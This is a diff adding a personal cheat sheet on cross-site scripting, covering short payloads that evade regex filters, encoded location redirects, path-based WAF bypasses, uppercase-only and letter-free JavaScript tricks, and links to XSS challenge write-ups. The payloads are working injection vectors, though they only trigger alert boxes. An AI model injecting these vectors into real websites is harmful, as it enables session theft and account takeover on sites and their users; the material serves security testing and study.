@@ -1,0 +1,98 @@
+[ XSS by @cgvwzq ]
+
+= XSS vectors =
+
+If you are using http://ha.ckers.org/xss.html you are too old... Current vectors can be found on https://html5sec.org or in https://twitter.com/XSSVector. A short and quick list for bypassing simple regexp filters can be:
+
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<input src=x type=image onerror=alert(1)>
+<iframe src=javascript:alert(1)></iframe>
+<input onfocus=alert(1) autofocus>
+<script src=data:,alert(1)></script>
+<isindex formaction=javascript:alert(1) type=submit>
+
+== Exploitations and escapes ==
+
+- location='\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29'
+    Example: <input onfocus=location='\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29'>
+    Example: 
+
+
+= Pathname spoofing =
+
+Many WAFs only check for URL parameters (after ? symbol), but don't check the own path. This is because when the path is modified, normally the server will response with a 404 Not found error, but some servers have this issue:
+
+http://somehost.com/path/to/resource/?filtered_params
+
+http://somehost.com/path/to/"w00t'>%2f../resource/?filtered_params
+
+Both requests will return the same resource, but in the second one we will have tha pathname controlle by us. The key is the "%2f", with a simply slash the browser would reduce the URL in order to save requests.
+
+This can be very usefull when a XSS reflects the URL in the page or even in a DOM based that is using "location.pathname". But as I said this depends on the server.
+
+= Only capital letters =
+
+Sometimes the server reflects the input after converting it into upper case, this can be circumvent by the following:
+
+== HTML is case insensitive ==
+
+Since HTML is case insensitive (and also DNS) it's possible to use some vectors as the above ones. In addition, URLs are automatically urldecoded by the server so:
+
+<SCRIPT/SRC=DATA:%61%6c%65%72%74%28%31%29></SCRIPT>
+
+<IFRAME/SRC=JAVASCRIPT:%61%6c%65%72%74%28%31%29></SCRIPT>
+
+<SCRIPT/SRC=HTTP://LOCALHOST/></SCRIPT>
+
+<SVG/ONLOAD=&#97&#108&#101&#114&#116(1)>
+
+=== SVG is an XML file ===
+
+Modern browsers support SVG elements for graphical vector images, these also support script elements and by being XML files XML Entity encoding is supported:
+
+<svg><script>&#97&#108&#101&#114&#116(1)</script></svg>
+
+Note: HTML entities allow both hexadecimal (&#x61;) and decimal (&#97) representation, decimal ones don't need the last semicolon.
+
+=== JS w/o [a-z] ===
+
+Javascript is beautiful and evil and allows things like this:
+
+<SCRIPT>[]["\143\157\156\163\164\162\165\143\164\157\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("\141\154\145\162\164(1)")()</SCRIPT>
+
+Why this works?
+
+[] == Array literal
+
+[]['constructor'] == Array()
+
+[]['constructor']['constructor'] == Function()
+
+Function('alert(1)')() == eval (arbitrary code execution)
+
+Since Javascript strings can be codified in many ways, is no necessary to use alphabetic letters just their octal scape.
+
+It's even possible to craft completely non-alphanumeric payloads by using casting.
+
+== Relative vs. absolute paths ==
+
+Browsers have a lot of quirks when treating URLs, this can be abused to bypass some filters that restrict some expression as http:, https: foo:// ....
+
+A complete list can be found in http://kotowicz.net/absolute/.
+
+A common trick is using only double slash (//) for absolute URLs instead of http://, or Chrome that automatically converts any backslash to a normal slash when parsing an URL. For example: \\attacker.com.
+
+== Challenges ==
+
+There are many interesting challenges and writeups with tricks bypassing filters or executing code in exotic scenarios. Play if you're a man:
+
+* http://escape.alf.nu/ - writeups: 
+    http://www.pwntester.com/blog/2014/01/06/escape-alf-nu-xss-challenges-write-ups-part-148/
+    http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/
+
+* http://prompt.ml/ - writeup: https://github.com/cure53/xss-challenge-wiki/wiki/prompt.ml
+
+* http://www.shafigullin.pro/s03/
+
+* Moar writeups: https://github.com/cure53/xss-challenge-wiki/wiki/
